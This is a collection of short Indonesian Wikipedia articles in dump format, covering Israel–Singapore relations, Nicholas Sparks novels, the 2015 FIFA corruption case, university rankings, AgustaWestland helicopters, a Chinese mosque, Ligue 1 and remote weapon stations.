Sho memasuki SD, SMP, dan SMA yang masih berhubungan dengan Universitas Keio. Setelah lulus dari SMA, meskipun ia telah debut sebagai Arashi, Sho tetap melanjutkan pendidikannya ke Universitas Keio dan lulus pada tahun 2004, dengan gelar Sarjana Ekonomi.



</doc>
<doc id="1757974" url="https://id.wikipedia.org/wiki?curid=1757974" title="Hubungan Israel dengan Singapura">
Hubungan Israel dengan Singapura

Hubungan Israel –Singapura adalah hubungan luar negeri antara negara Israel dan Singapura. Hubungan antar kedua negara sangat erat, dan diketahui memiliki Hubungan Istimewa. Kedua negara membangun hubungan diplomatik sejak Mei 1969. Israel memiliki sebuah kedutaan besar di Singapura. Singapura diwakilkan di Israel oleh seorang duta besar non-residen yang berbasis di Singapura (dalam Kementerian Luar Negeri) dan melalui konsulat kehormatan di Tel Aviv.

Kedua negara menjalani kerjasama keamanan jangka panjang, dengan adanya kerjasama di bidang industri persenjataan Israel -Singapura, kerjasama pembangunan and a perdagangan militer tingkat tinggi di antara kedua negara.

Pada 2005, kedua negara menandatangani sebuah kerjasama untuk mempermudah aliran arus barang dan investasi antara Israel dan Singapura, dalam kunjungannya ke Israel Perdana Menteri Senior Goh Chok Tong dengan para anggota kabinet Israel dan Perdana Menteri Israel saat itu, Ariel Sharon.

Singapura adalah satu dari 41 negara yang tidak ikut memberikan suara dalam Resolusi “Status Palestina dalam Perserikatan Bangsa-Bangsa” di pertemuan Majelis Umum PBB pada 29 November 2012 yang menjadikannya sebagai negara Non-Anggota Pemerhati Status Palestina. Dalam menjelaskan alasan ketidak sertaan SIngapura terebut, Menteri Senior Masagos Zulkifli menyatakan bahwa Singapore meyakini “bahwa hanya melalui sebuah penyelesaian negosiasi yang sesuai dengan Resolusi Dewan Keamanan PBB 242 yang dapat memberikan dasar untuk solusi jangka panjang” dan bahwa “kedua pihak memiliki hak yang sah dan saling bertanggung jawab, dan harus siap dan berkompromi mencapai kepentingan yang lebih besar untuk berdamai”.

Pada 1990, Kamar Dagang dan Niaga Singapura - Israel mulai beroperasi.

Pada 2013, total perdagangan Singapura - Israel mencapai S$1.956 milyar, melonjak 24.6% dari tahun ke tahun sejak 2012, menurut angka dari Kedutaan Besar Israel di Singapura dan IE Singapura. Singapura adalah negara pengimpor dari Israel, dan Israel mengekspor sebagian besar peralatan listrik ke Singapura, sementara itu Singapura mengekspor sebagian besar mesin dan peralatan komputer ke Israel.

Pada Januari 1968, sebelum hubungan diplomatik dimulai, Singapura membuat perjanjian untuk membeli 72 surplus tank AMX-13 dari Israel.Pada akhir 1980an, Singapura telah membeli lebih dari 350 tank ini.

Dalam tahun-tahun pembentukan Angkatan Bersenjata Singapura pada akhir 1960an, Singapura mencari saran dan berkonsultasi dari pengalaman militer Israel untuk membentuk sebuah pertahanan militer yang handal pasca-kemerdekaan Singapura. Israel menanggapi hal ini, dengan memberikan pelatihan pengembangan dan doktrin militer. Karena kepekaan pada mendominannya daerah-Muslim, Singapura tetap menjaga kerja sama ini bersifat" low-profile".

Over the years, Singapore and Israel enjoy close co-operation. Today, the two countries share military platforms, including early warning aircraft, anti-tank and anti-aircraft missile systems, aircraft and surveillance technologies.

Selama bertahun-tahun, Singapura dan Israel menjalani hubungan kerjasama yang erat. Saat ini, kedua negara saling berbagi platform militer, termasuk pesawat peringatan dini, sistem anti-tank dan rudal anti-pesawat, pesawat tempur dan teknologi pengawasan.

Pemerintah Singapura telah menyatakan keprihatinan atas Jalur Gaza. Pada bulan Januari 2009, Kementerian Luar Negeri Singapura mengatakan Perang Gaza, "Ini merupakan perkembangan yang sangat mengganggu," bahwa "Ini hanya dapat memperburuk situasi kemanusiaan sudah serius." [10] Setelah gencatan senjata, Kementerian Luar Negeri Singapura menyebutnya sebagai "perkembangan positif "tapi tetap" sangat prihatin atas situasi kemanusiaan di Gaza dan mendesak semua pihak untuk mengambil langkah-langkah mendesak untuk mengatasi situasi


</doc>
<doc id="1757977" url="https://id.wikipedia.org/wiki?curid=1757977" title="Piala Dunia U-20 FIFA 2015 Grup C">
Piala Dunia U-20 FIFA 2015 Grup C

Grup C Piala Dunia U-20 FIFA 2015 terdiri dari ,Kolombia, dan Senegal.Pertandingan akan berlangsung dari tanggal 31 Mei sampai 6 Juni 2015.
(H) adalah Tuan Rumah<br>
? adalah belum diketahui


</doc>
<doc id="1757979" url="https://id.wikipedia.org/wiki?curid=1757979" title="Piala Dunia U-20 FIFA 2015 Grup D">
Piala Dunia U-20 FIFA 2015 Grup D

Grup D Piala Dunia U-20 FIFA 2015 terdiri dari Meksiko, , , dan Serbia. Pertandingan akan berlangsung pada tanggal 31 Mei sampai 6 Juni 2015.


</doc>
<doc id="1757986" url="https://id.wikipedia.org/wiki?curid=1757986" title="École Polytechnique Fédérale de Lausanne">
École Polytechnique Fédérale de Lausanne



</doc>
<doc id="1757993" url="https://id.wikipedia.org/wiki?curid=1757993" title="The Longest Ride (novel)">
The Longest Ride (novel)

The Longest Ride adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan September 2013 oleh penerbit Grand Central Publishing di Amerika Serikat. Novel ini berlatar tempat di Black Mountain, Carolina Utara.

Ira Levinson mengalami permasalahan. Di usia 91 tahun, dengan kesehatan yang buruk dan sendirian di dunia, ia menemukan dirinya terdampar di suatu tanggul terisolasi setelah kecelakaan mobil. Mengalami luka-luka, ia berjuang untuk mempertahankan kesadaran sampai penglihatan kabur terwujud dan datang berfokus di sisinya: istrinya, Ruth, yang meninggal sembilan tahun yang lalu. Didesak untuk bertahan, Ruth memaksanya untuk tetap berhati-hati dengan menceritakan kisah-kisah hidup mereka bersama-sama - bagaimana mereka bertemu, beberapa lukisan berharga yang mereka kumpulkan bersama-sama, hari-hari gelap saat Perang Dunia II, dan pengaruhnya terhadap mereka dan keluarganya. Ira mengetahui bahwa Ruth tidak mungkin di dalam mobil dengannya, tapi ia mengingat kata-katanya dan kenangan, mengenang penderitaan dan kebahagiaan yang berujung pada pernikahan mereka.

Beberapa mil jauhnya di sebuah acara naik banteng lokal, setelah pulih dari perpisahan, mahasiswi senior Wake Forest College Sophia Danko bertemu seorang koboi muda bernama Luke, yang memiliki kemiripan kepada laki-laki istimewa yang ia temui di sekolah. Melalui Luke, Sophia diperkenalkan ke dunia di mana taruhannya adalah kelangsungan hidup dan keberhasilan, kehancuran dan penghargaan - bahkan hidup dan mati - tampak kurang menentukan dalam kehidupannya sehari-hari. Saat ia dan Luke jatuh cinta, Sophia menemukan dirinya membayangkan masa depan yang jauh dari rencana-rencananya - masa depan bahwa Luke memiliki kekuatan untuk membuat ulang, jika rahasia yang Luke tutup rapat tidak menghancurkannya langsung.

Ira dan Ruth. Sophia dan Luke. Dua pasangan yang memiliki banyak persamaan, dan yang dipisahkan oleh tahun dan pengalaman. Namun, kehidupan mereka akan bertemu dengan kepedihan yang tak terduga, mengingat bahwa bahkan keputusan yang paling sulit dapat menghasilkan perjalanan yang luar biasa: melampaui keputusasaan, kematian, menjadi pencapaian terjauh dari hati manusia.


Film adaptasi dari novel "The Longest Ride" dirilis pada tanggal 10 April 2015 di Amerika Serikat. Film ini disutradarai oleh George Tillman Jr dan diproduseri oleh Marty Bowen, Wyck Godfrey, Theresa Park, dan Nicholas Sparks. Naskah dari film ini ditulis oleh Craig Bolotin. Film ini dibintangi oleh Scott Eastwood sebagai Luke Collins, Britt Robertson sebagai Sophia Danko, Jack Huston sebagai Ira Levinson, Oona Chaplin sebagai Ruth, dan Alan Alda sebagai Ira Levinson tua.



</doc>
<doc id="1757999" url="https://id.wikipedia.org/wiki?curid=1757999" title="Kasus korupsi FIFA 2015">
Kasus korupsi FIFA 2015

Empat belas orang, termasuk sembilan orang yang terkait dengan badan sepak bola dunia, FIFA, didakwa pada bulan Mei 2015 sehubungan dengan kasus penipuan transfer, pemerasan, dan pencucian uang yang sedang diselidiki Biro Investigasi Federal (FBI) Amerika Serikat. Tujuh pejabat FIFA ditangkap di Hotel Baur au Lac, Zürich, pada tanggal 27 Mei. Mereka saat itu sedang bersiap-siap menghadiri Kongres FIFA ke-65 yang mencakup kegiatan pemilihan Presiden FIFA. Mereka akan diekstradisi ke Amerika Serikat atas tuduhan menerima suap senilai . Markas CONCACAF di Miami ikut digeledah.

Pada tahun 2013, mantan Presiden FIFA João Havelange dan Presiden Konfederasi Sepak Bola Brasil Ricardo Teixeira terbukti mengambil uang suap senilai jutaan doalr. Anggota komite eksekutif FIFA dijatuhi hukuman seumur hidup atas tuduhan penyuapan dan korupsi.

Penangkapan ini berkaitan dengan tuduhan penyuapan, penipuan, dan pencucian uang dalam pemberian hak siar media dan pemasaran pertandingan FIFA di Amerika. Nilai uangnya diperkirakan mencapai $150 juta, $110 juta di antaranya merupakan suap yang berkaitan dengan perhelatan Copa América Centenario di Amerika Serikat tahun 2016. Selain itu, dakwaan tersebut menyebutkan bahwa uang suap digunakan untuk memuluskan kontrak sponsor pakaian, proses seleksi tuan rumah Piala Dunia FIFA 2010, pemilihan presiden FIFA 2011. Sebuah perusahaan perlengkapan olahraga anonim (Nike, Inc. menurut berbagai sumber) membayar uang suap sebesar $40 juta supaya ditunjuk sebagai penyedia tunggal perlengkapan, sepatu, dan aksesoris tim nasional sepak bola Brasil.

Pada tahun 2011, eksekutif sepak bola Amerika Serikat dan pejabat CONCACAF Chuck Blazer mengaku bersalah atas 10 tuduhan kejahatan, termasuk konspirasi penipuan transfer, pencucian uang, dan pelanggaran pajak penghasilan dan perbankan. Pengakuan Blazer merupakan tindakan yang bertujuan menghindari tuduhan pemerasan dengan hukuman penjara 20 tahun. Blazer kemudian merekam semua pertemuannya dengan pejabat FIFA dan kabarnya membawa gantungan kunci yang dilengkapi alat perekam pada Olimpiade Musim Panas 2012 di London. Sebelumnya Blazer bertemu dengan Dinas Pendapatan Dalam Negeri Amerika Serikat dan FBI yang sudah menyiapkan beberapa tuduhan keterlibatannya dalam penyuapan proses pengundian tuan rumah Piala Dunia FIFA sejak awal 1990-an sampai seterusnya. Dakwaan terhadap Blazer dibacakan pada tanggal 27 Mei 2015 bertepatan dengan penangkapan di Zurich.

Sebanyak 18 orang dan 2 perusahaan telah didakwa dalam kasus ini, termasuk 9 pejabat FIFA dan 5 pebisnis.

Menanggapi penyelidikan FBI, pihak berwenang di Swiss melakukan penyelidikan kriminal terpisah terhadap proses pengundian di balik pemberian hak penyelenggaraan Piala Dunia FIFA 2018 ke Rusia dan Piala Dunia FIFA 2022 ke Qatar. Kepolisian Swiss menyita "data elektronik dan dokumen" dalam proses penggeledahan markas FIFA di Zürich bersamaan dengan penangkapan pejabat FIFA.




</doc>
<doc id="1758002" url="https://id.wikipedia.org/wiki?curid=1758002" title="Peringkat perguruan tinggi dunia">
Peringkat perguruan tinggi dunia

Peringkat Perguruan Tinggi Dunia merupakan pemeringkatan suatu lembaga perguruan tinggi diseluruh dunia atas beragam kombinasi faktor penilaian. Pemeringkatan ini dilakukan oleh beragam institusi pemeringkat yang berasal dari suatu organisasi, majalah, koran, website, pemerintah, atau perguruan tinggi. Selain memeringkat seluruh lembaga, para pemeringkat juga memberikan peringkat berdasarkan suatu program, departemen, dan fakultas. Namun tidak ada peringkat perguruan tinggi yang memeringkat kualitas akademik siswa. Metodologi pemeringkatan perguruan tinggi telah menghasilkan banyak perdebatan tentang kegunaan dan akurasi peringkat.

4 International Colleges & Universities atau 4ICU adalah suatu mesin pencari dan direktori yang melakukan penilaian berdasarkan kepopuleran situs yang dimiliki oleh 11.307 perguruan tinggi di seluruh dunia yang telah terakreditasi dan tersebar dalam 200 negara. Komponen penilaian yang digunakan 4ICU adalah Google Page Rank, Alexa Traffic Rank, dan Majestic SEO (Referring Domain, Citation Flow, Citation Trust). Update hasil pemeringkatan dirilis 4ICU setiap bulan Januari dan Juli.

Academic Ranking of World Universities (ARWU) atau Peringkat Akademis Universitas Dunia merupakan peringkat dari sebuah institusi perguruan tinggi dikompilasi oleh Universitas Jiao Tong Shanghai.

Metodologi penilaian yang digunakan adalah:

Peringkat Universitas Dunia Webometrics atau Webometrics adalah merupakan organisasi yang melakukan pemeringkatan perguruan tinggi seluruh dunia, sebagai rintisan dari Cybermetrics Lab, sebuah kelompok penelitian yang masih merupakan bagian dari Consejo Superior de Investigaciones Científicas, lembaga penelitian terbesar di Spanyol. Update hasil pemeringkatan dirilis Webometrics setiap bulan Januari dan Juli.

Komponen yang digunakan Webometrics untuk pemeringkatan adalah Visibility (50%) yang terdiri dari Impact yaitu jumlah link eksternal menurut Ahrefs & Majestic SEO, dan Activity (50%) yang terdiri dari Presence (20%), yakni jumlah halaman situs domain menurut Google, Openness (20%) yakni jumlah publikasi ilmiah dalam format rich files (*pdf, *doc, *ppt, *ps) menurut Google Scholar, dan Excellence (10%) yakni jumlah publikasi ilmiah menurut Scimago.



</doc>
<doc id="1758004" url="https://id.wikipedia.org/wiki?curid=1758004" title="SMA Negeri di Kabupaten Garut">
SMA Negeri di Kabupaten Garut

Jalan Merdeka No. 91 Tarogong Kidul 44151
Jalan Guntur No. 3 Leles 44152
Jalan Jend. A. Yani No. Cibatu 44185
Jalan Perkebunan Giriwaas No. Cikajang 44171
Jalan Cikopo No. Pameungpeuk 44175
Jalan Guntur Melati No. Tarogong Kidul 44151
Jalan Hanjuang No. 20 Bungbulang 44165
Jalan Raya Cilawu No. 181 Cilawu
Jalan Bojongtangsi No. 224 Malangbong 44188
Jalan Raya Leuwigoong No. 21 Leuwigoong 44192
Jalan Siliwangi2 Regol 44114
Jalan Raya Cisewu No. 35 Cisewu 44166
Jalan Raya Selaawi No. Balubur Limbangan 44186
Jalan Lapang Trikarya No. Sukawening 44184
Jalan Panawuan No. 3A Tarogong Kidul 44151
Jalan Raya Cidatar No. 810A Cisurupan 44163
Jalan Raya Samarang No. Samarang 44161
Jalan Perum Abdi Negara No. 1 Karangpawita 44182
Jaan Raya Simpang No. 100 Bayongbong 44162
Jalan Surapati No. 19 Singajaya 44173
Jalan Panorama Cibungur No. Talegong 44167
Jalan Raya Cisompet No. Cisompet
Jalan Arinem No. Tarogong Kaler 44164
Jalan Pangauban No. Cisurupan
Jalan K.H Hasan Arief No. Banyuresmi
Jalan Tegal Panjang No. Sucinaraja
Jalan Raya Mirameu No. Cibalong 44176
Jalan Raya Caringin No. Caringin 44166
Jalan Raya Mekarmukti No. Mekarmukti
Jalan Raya Cihurip No. Cihurip

Jalan Jend. Ahmad Yani Koropeak Karangpawitan 44182
Jalan Pembangunan No. 144 Tarogong Kidul 44151
Jalan Wanakerta No. 28 Cibatu 44185
Jalan Mirameu No. 361 Pameungpeuk 44175
Jalan Purwavhakti No. 54 Cisewu 44166


</doc>
<doc id="1758005" url="https://id.wikipedia.org/wiki?curid=1758005" title="The Choice (novel)">
The Choice (novel)

The Choice (terjemahan bahasa Indonesia: Pilihan) adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan September 2007 oleh penerbit Grand Central Publishing di Amerika Serikat dan Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di Beaufort, Carolina Utara.

Travis Parker memiliki segalanya yang diinginkan: pekerjaan yang baik, teman-teman yang setia, bahkan rumah tepi pantai di kota kecil di Carolina Utara. Dalam mengejar kehidupan yang sempurna - berlayar, berenang, dan pesta barbeque dengan sahabatnya - ia memegang keyakinan bahwa berhubungan serius dengan seorang wanita hanya akan melunturkan karakter dan gayanya. Sampai Gabby Holland pindah ke sebelah rumahnya. Meskipun ia berupaya menjadi tetangga yang baik, tampaknya Gabby bersikap dingin dengannya, dan kehadiran pacar lamanya tidak membantu. Travis tidak bisa berhenti berusaha jatuh cinta pada tetangga barunya, dan upaya gigihnya membuat mereka berdua ke ambang pintu dari sebuah perjalanan yang tidak diduga. Adanya cinta muda, perkawinan dan keluarga, The Choice akhirnya menghadapkan kita dengan pertanyaan yang meneguhkan hati: seberapa jauh Anda pergi untuk menjaga harapan cinta yang hidup?


Film adaptasi dari novel "The Choice" dirilis pada tanggal 8 April 2016 di Amerika Serikat. Film ini disutradarai oleh Ross Katz dan diproduseri oleh Theresa Park, Peter Safran, dan Nicholas Sparks. Naskah dari film ini ditulis oleh Bryan Sipe. Film ini dibintangi oleh Benjamin Walker sebagai Travis Parker, Teresa Palmer sebagai Gabby Holland, Tom Welling sebagai Ryan, Alexandra Daddario sebagai Monica, Maggie Grace sebagai Stephanie Parker (saudara Travis), dan Tom Wilkinson sebagai Dr. Shep.



</doc>
<doc id="1758010" url="https://id.wikipedia.org/wiki?curid=1758010" title="Nasser (militer)">
Nasser (militer)

Kolonel Pas. Nasser, "S.T." () adalah perwira menengah TNI Angkatan Udara yang berasal dari Korps Pasukan Khas. Yang saat ini menjabat sebagai Komandan Wing 2 Paskhas yang sebelumnya menjabat Staf Ahli Dankorpaskhas. Ia dilantik menjadi Komandan Wing 2 Paskhas ke-10 pada tanggal 8 Oktober 2018, menggantikan Kolonel Pas Asep Dicky Lukman. Mengawali kariernya di TNI Angkatan Udara mulai tanggal 30 Mei 1996 setelah menyelesaikan pendidikan militer di Akademi Angkatan Udara.

Nasser adalah putra kedua dari empat bersaudara dari orang tua bernama H. Muchsin Saleh dan Hj. Aminah, dan merupakan putra Belitung asli yang menamatkan sekolah dasarnya di SD Negeri IX Tanjung Pandan pada tahun 1985. Kemudian melanjutkan pendidikan menengah pertama di SMP Negeri 1 Tanjung Pandan sampai tamat tahun 1988, dan melanjutkan pendidikan menengah atas di SMA Negeri 1 Tanjung Pandan, selanjutnya menamatkan pendidikan Sekolah Menengah Atas di SMA Negeri 91 Jakarta pada tahun 1991. Kemudian melanjutkan pendidikan di Universitas Nurtanio, Bandung dan mendapatkan gelar S-1 Teknik.



</doc>
<doc id="1758050" url="https://id.wikipedia.org/wiki?curid=1758050" title="The Notebook (novel)">
The Notebook (novel)

The Notebook (terjemahan bahasa Indonesia: Buku Harian) adalah sebuah novel terjemahan dari novel asli Amerika Serikat karya Nicholas Sparks. Novel ini merupakan novel romantis yang dirilis pada bulan Oktober 1996 oleh penerbit Warner Books dan Grand Central Publishing di Amerika Serikat serta Gramedia Pustaka Utama di Indonesia. Novel ini berlatar tempat di New Bern, Carolina Utara.

Sekembalinya dari medan perang, Noah Calhoun senantiasa dihantui bayang-bayang gadis cantik yang dikenalnya empat belas tahun silam, dan amat dicintainya. Walau mereka tak pernah bertemu lagi, Noah merasa puas hidup dengan kenangan masa lalunya, namun tanpa terduga gadis itu kembali ke kotanya, untuk menemuinya sekali lagi. Allie Nelson, kini sudah bertunangan dengan pria lain, namun ia menyadari bahwa cintanya pada Noah tak pernah pudar ditelan waktu. Tapi dunia mereka begitu berbeda. Menghadapi pernikahannya yang tinggal beberapa minggu lagi, Allie dipaksa untuk mempertanyakan, apa sebenarnya harapan-harapan dan impiannya untuk masa depan, dan dengan siapakah ia ingin menjalani masa depan itu.


Film adaptasi dari novel "The Notebook" dirilis pada tanggal 25 Juni 2004 di Amerika Serikat. Film ini disutradarai oleh Nick Cassavetes dan diproduseri oleh Lynn Harris dan Mark Johnson. Naskah dari film ini ditulis oleh Jeremy Leven. Film ini dibintangi oleh Ryan Gosling sebagai Noah Calhoun, Rachel McAdams sebagai Allie, James Garner sebagai Noah Calhoun tua atau "Duke", Gena Rowlands sebagai Allie tua, Joan Allen sebagai Ann Hamilton (ibu Allie), dan James Marsden sebagai Lon Hammond Jr (tunangan Allie).



</doc>
<doc id="1758055" url="https://id.wikipedia.org/wiki?curid=1758055" title="AgustaWestland AW169">
AgustaWestland AW169

AgustaWestland AW169 adalah helikopter bermesin ganda, 10-kursi yang saat ini sedang dikembangkan oleh AgustaWestland.

Diumumkan oleh perusahaan di Farnborough International Air Show pada 19 Juli 2010, prototipe pertama terbang pada tanggal 10 Mei 2012.

Program pengujian akan melibatkan tiga prototipe lebih, dengan AW169 kedua dan ketiga direncanakan untuk bergabung dengan usaha kemudian pada tahun 2012, dan yang keempat pada tahun 2013. Sertifikasi dari AW169 diantisipasi untuk tahun 2014.

AW169 juga akan diproduksi di Philadelphia, Amerika Serikat.



</doc>
<doc id="1758056" url="https://id.wikipedia.org/wiki?curid=1758056" title="AgustaWestland AW189">
AgustaWestland AW189

AgustaWestland AW189 adalah helikopter bermesin ganda, menengah-angkat diproduksi oleh AgustaWestland, dan berasal dari AW149.

Model AW189 baru diumumkan oleh AgustaWestland di Paris International Air Show pada tanggal 20 Juni 2011. Perusahaan ini berencana untuk memiliki helikopter disertifikasi pada tahun 2013 dan dalam pelayanan pada tahun 2014. Heli ini disertifikasi oleh EASA Februari 2014 dan oleh FAA Maret 2015.

AW189 adalah pengembangan sipil dari AW149 militer, yang pada gilirannya merupakan perkembangan yang diperbesar dari AW139 tersebut. AgustaWestland menjual AW189 bertujuan untuk dukungan helikopter lepas pantai, mencari dan peran penyelamatan (SAR) dan transportasi penumpang, dan memiliki 16 kursi dan gearbox 50 menit run-kering untuk tujuan itu. AW189 memiliki operasi kokpit mirip dengan AW139 dan AW169.



</doc>
<doc id="1758057" url="https://id.wikipedia.org/wiki?curid=1758057" title="AgustaWestland AW159 Wildcat">
AgustaWestland AW159 Wildcat

AgustaWestland AW159 Wildcat (sebelumnya disebut Lynx Future dan Lynx Wildcat) merupakan versi perbaikan dari helikopter militer Westland Super Lynx dirancang untuk melayani utilitas di medan perang, pencarian dan penyelamatan (SAR) dan peran perang anti-permukaan.

Dalam layanan Inggris, varian umum sedang dioperasikan oleh Royal Navy dan Angkatan Darat Inggris untuk menggantikan pesawat rotor Lynx lama mereka. AW159 juga telah ditawarkan kepada beberapa pelanggan ekspor, termasuk Angkatan Laut Korea Selatan yang memesan 8 untuk tahun 2013.



</doc>
<doc id="1758058" url="https://id.wikipedia.org/wiki?curid=1758058" title="AgustaWestland AW149">
AgustaWestland AW149

AgustaWestland AW149 adalah helikopter militer angkat menengah sedang dikembangkan oleh AgustaWestland.

Pada 20 Juni 2011 AgustaWestland mengumumkan AW189, pengembangan sipil AW149, untuk layanan pada tahun 2013.



</doc>
<doc id="1758060" url="https://id.wikipedia.org/wiki?curid=1758060" title="Agusta CP-110">
Agusta CP-110

Agusta CP-110, juga dikenal sebagai CVV P.110 atau Politecnico P.110, adalah prototipe pesawat ringan pertama Italia empat kursi diterbangkan pada tahun 1951 yang gagal untuk menarik minat baik dari operator sipil atau militer, meskipun itu dievaluasi oleh Aeronautica Militare (Angkatan Udara Italia).

Awalnya dirancang dan dibangun oleh CVV - (Centro Volo a Vela del Politecnico di Milano), pesawat produksi yang telah dibangun oleh Agusta, tapi minat kurang.



</doc>
<doc id="1758061" url="https://id.wikipedia.org/wiki?curid=1758061" title="Agusta GA.140">
Agusta GA.140

Agusta GA.140/V adalah mesin 4-silinder, berpendingin udara, horizontal dipasang secara vertikal, yang dikembangkan di Italia untuk digunakan helikopter dan diproduksi 1962-1969.




</doc>
<doc id="1758062" url="https://id.wikipedia.org/wiki?curid=1758062" title="AgustaWestland Project Zero">
AgustaWestland Project Zero

AgustaWestland Project Zero adalah teknologi pesawat demonstrator hybrid tiltrotor / fan-in-sayap, yang diluncurkan pada Desember 2010.

Pesawat ini dikembangkan sebagai proyek skunk work dengan insinyur lebih dari dua lusin waktu penuh dari AgustaWestland dan perusahaan 15 mitra termasuk Selex ES. Bekerja dengan perusahaan lain di Italia, Inggris, Amerika Serikat dan Jepang, tim bekerja hampir 24 jam sehari / tujuh hari seminggu selama enam bulan dengan konsep ke penerbangan pertama. Perusahaan yang terlibat termasuk Stile Bertone untuk styling aerodinamis, Lola Komposit untuk eksterior CFRP.

Program ini diumumkan kepada publik pada Asosiasi Helikopter Internasional (HAI) Heli-Expo pada tanggal 4 Maret 2013. Pesawat ini ditampilkan di Paris Air Show pada bulan Juni 2013.

Tim Project Zero dianugerahi AHS Internasional bergengsi 2014 Grover E. Bell Award nama akhir Larry Bell yang diberikan kepada individu atau organisasi yang telah membina dan mendorong penelitian dan eksperimen dalam pengembangan helikopter.




</doc>
<doc id="1758063" url="https://id.wikipedia.org/wiki?curid=1758063" title="Meridionali/Agusta EMA 124">
Meridionali/Agusta EMA 124

Meridionali/Agusta EMA 124 adalah sebuah helikopter utilitas ringan diterbangkan dalam bentuk prototipe di Italia pada tahun 1970. Desain ini dilakukan oleh Agusta untuk produksi dalam usaha patungan dengan Elicotteri Meridionali, berdasarkan Bell 47 yang Agusta sedang membangun di bawah lisensi di waktu itu.

Sebuah prototipe tunggal diterbangkan pada tahun 1970 (pendaftaran I-EMAF), tapi tidak ada yang datang lebih dari proyek.



</doc>
<doc id="1758066" url="https://id.wikipedia.org/wiki?curid=1758066" title="Masjid Qingjing">
Masjid Qingjing

Masjid Qingjing (; ), dikenal juga dengan nama Masjid Ashab, adalah sebuah Masjid yang terletak di kota Quanzhou, Fujian, Tiongkok.

Dibangun pada 1009, masjid yang berasitektur Arab ini adalah masjid yang tertua dibangun di Tiongkok.

Luas areanya adalah . Ada banyak masjid-masjid pada masa Dinasti Song yang dibangun dengan menggunakan arsitektur Arab di kota-kota pesisir, karena masyarakat pedagang-pedagang Arab yang tinggal di dalamnya.


</doc>
<doc id="1758068" url="https://id.wikipedia.org/wiki?curid=1758068" title="Ligue 1 2014–2015">
Ligue 1 2014–2015

Ligue 1 2014–15 merupakan edisi ke 77 dari penyelenggaraan liga utama Prancis.

Paris Saint-Germain adalah juara bertahan setelah memenangi gelar juara liga musim 2013–14, dan kembali menjadi juara pada musim ini.

Liga diikuti oleh 20 klub, dengan tiga klub promosi dari Ligue 2 untuk menggantikan tiga klub yang degradasi pada musim Ligue 1 2013–14, seluruh klub yang akan mengikuti liga memerlukan izin dari DNCG.

Metz menjadi klub pertama yang meraih promosi setelah enam tahun di divisi bawah, disusul Lens yang telah tiga tahun di divisi bawah dan ditutup dengan Caen yang meraih promosi setelah dua tahun di divisi bawah.

 


</doc>
<doc id="1758073" url="https://id.wikipedia.org/wiki?curid=1758073" title="SMK Muhammadiyah 1 Wonosobo">
SMK Muhammadiyah 1 Wonosobo

SMK Muhammadiyah 1 Wonosobo adalah sekolah menengah tingkat atas kejuruan yang berkedudukan di Kabupaten Wonosobo, Jawa Tengah. Sekolah ini berdiri pada tahun 1997. Program studi yang diajarkan adalah Akuntansi, Pemasaran, Rekayasa Perangkat Lunak, Teknik Komputer Jaringan, dan Teknik Otomotif. Melaluii Surat Keputusan Dinas Pendidikan Nasional Provinsi Jawa Tengah nomor 0536/03.02/PR/2000, pada tanggal 21 Desember 2000 SMKS Muhammadiyah 1 Wonosobo menerima status diakui pada akreditasi pertama. Sekolah ini juga telah menerima sertifikat ISO 9001:2008 pada tahun 2010 dari PT. TUV Yogyakarta. Siswa yang ingin melanjutkan ke jenjang pendidikan yang lebih tinggi, SMK Muhammadiyah 1 Wonosobo telah memfasilitas untuk meraih beasiswa Bidikmisi maupun Etos, pendaftaran SNMPTN, dan SBMPTN.

SMK Muhammadiyah 1 Wonosobo sudah bekerja sama dengan perusahaan dalam dan luar negeri, antara lain:


</doc>
<doc id="1758077" url="https://id.wikipedia.org/wiki?curid=1758077" title="Agusta GA.70">
Agusta GA.70

Agusta GA.70 adalah mesin horizontal 4-silinder, berpendingin udara, dikembangkan di Italia untuk pesawat ringan dan penggunaan helikopter. GA.70/V menampilkan bah bawah untuk aplikasi vertikal dan dinilai di 158hp. Mesin itu diproduksi pada 1950-an dan 60-an.

Pemasangan horisontal untuk pesawat ringan.
Vertikal mounting untuk helikopter.



</doc>
<doc id="1758078" url="https://id.wikipedia.org/wiki?curid=1758078" title="Agusta GA.40">
Agusta GA.40

Agusta GA.40 adalah mesin horizontal 2-silinder, berpendingin udara, dikembangkan di Italia oleh Agusta digunakan untuk pesawat ringan. Mesin itu dimaksudkan untuk digunakan dalam motorgliders.

Mesin ini diproduksi pada 1950-an dan 60-an.


</doc>
<doc id="1758081" url="https://id.wikipedia.org/wiki?curid=1758081" title="Hi! School: Love On">
Hi! School: Love On

Hi! School – Love On () adalah serial televisi Korea Selatan tahun 2014 yang dibintangi oleh Kim Sae-ron, Nam Woo-hyun dan Lee Sung-yeol di Infinite. Drama ini disiarkan KBS2 dari 11 Juli sampai 19 Desember 2014 pada hari Jumat pukul 20:55 untuk 20 episode.








</doc>
<doc id="1758083" url="https://id.wikipedia.org/wiki?curid=1758083" title="SWARM">
SWARM

SWARM Remote Weapon System (Stabilised Weapon And Reconnaissance Mount) adalah sistem senjata jarak jauh sepenuhnya lapis baja yang dirancang dan dibangun oleh Thales Group di Glasgow, Skotlandia. Sistem SWARM terdiri dari dua rakitan utama: Gun Processing and Interface Unit (GPIU), yang dioperasikan di dalam kendaraan, dan Weapon and Sensor Platform (WASP) eksternal.

Alat ini dapat menembakkan berbagai senjata, dan memanfaatkan beberapa sensor. Di Korps Marinir AS' Gladiator Tactical Unmanned Ground Vehicle (TUGV), dilengkapi dengan 7,62 mm M240 dan sensor siang/malam.



</doc>
<doc id="1758085" url="https://id.wikipedia.org/wiki?curid=1758085" title="Samson Remote Controlled Weapon Station">
Samson Remote Controlled Weapon Station

Samson Remote Controlled Weapon Station (RCWS), juga dikenal sebagai Katlanit (קטלנית dalam bahasa Ibrani: "mematikan") adalah Sistem Senjata remote yang memungkinkan berbagai perangkat untuk dioperasikan secara otomatis atau dengan remote control, termasuk senapan mesin 5,56 mm, 7,62 mm, dan 12,7 mm, 40 mm, peluncur granat otomatis, rudal anti-tank dan polong pengamatan.

Ada total dari tiga varian dari keluarga Samson.



</doc>
<doc id="1758088" url="https://id.wikipedia.org/wiki?curid=1758088" title="Frank Seiberling">
Frank Seiberling

